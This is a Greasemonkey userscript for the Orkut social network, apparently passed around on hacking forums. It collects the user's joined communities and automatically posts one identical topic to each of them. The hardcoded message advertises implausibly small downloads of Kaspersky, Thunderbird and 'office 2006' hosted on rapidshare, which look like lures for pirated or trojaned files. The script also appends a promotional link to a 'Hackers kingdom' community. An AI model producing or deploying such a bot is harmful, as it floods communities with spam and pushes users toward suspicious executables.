    // ==UserScript==
    // @name           Topic Poster
    // @author        rajputgal
    // @description    This script will Post same topic in all joined communities easily, You just need to enter capatcha and press enter and it will post topic smoothly. Created by someone else and fixed by Aman.
    // @namespace      Orkuted.com
    // @include        http://www.orkut.com/*
    // ==/UserScript==
   
    var subject = "Use ful links";
   var msg = "Download kaspersky internet security suite in just 6 mb 

[b][red]rapidshare.com/files/99647703/Kaspersky_Lab.exe for kaspersky

[/b]Download mozilla thunderbird in just 6 mb[/red][b]

rapidshare.com/files/99650235/Mozilla_Thunderbird.exe

[blue]download office 2006 in just 1.6 mb today[/b]

rapidshare.com/files/100154130/office_2006.kgb[/b]
";
  
  
  
  
  
  
  
  
  
  
   var credit = "[b]Visit www[i].[/i]orkut[i].[/i]com[i]/[/i]CommunityJoin[i].[/i]aspx?cmm=36220146 [/b]"; // It will make me happy if you put this line while posting in communities however its not necessary to put in it.
  
   window.addEventListener("load", function(e) {
   if(document.location.href.indexOf("Communities.aspx")>=0)
   {
       var anchorTags = document.getElementsByTagName('a');
       var communities = "";
       var j=0;
       for(var i=0;i<anchorTags.length-1;i++)
       {
           if(anchorTags[i].href.indexOf("Community.aspx")>=0)
           {
               if(j>0)
               {
                   communities=communities+",";
               }
               communities=communities+anchorTags[i].href.split("cmm=")[1];
               j++;
           }   
       }
       GM_setValue("communities",communities);
       GM_setValue("postCount",0);
       document.location.href="http://www.orkut.com/CommMsgPost.aspx?cmm="+GM_getValue("communities").split(",")[GM_getValue("postCount")];
   }
   if(document.location.href.indexOf("CommMsgPost.aspx")>=0)
   {
       GM_setValue("postCount",GM_getValue("postCount")+1);
       document.getElementById("subject").value= subject;
       document.getElementById("messageBody").value= msg + credit;
       document.location.href="javascript:_submitForm(document.forms[1], 'submit', '')"
   }
   if(document.location.href.indexOf("CommMsgs.aspx")>=0)
   {
       if(GM_getValue("communities").split(",").length>GM_getValue("postCount"))
       {
           document.location.href="http://www.orkut.com/CommMsgPost.aspx?cmm="+GM_getValue("communities").split(",")[GM_getValue("postCount")];
       }
       else
       {
           alert("All the communities have been posted with the message. Visit Hackers kingdom for hack Related topics");
       }
   }
   }, false);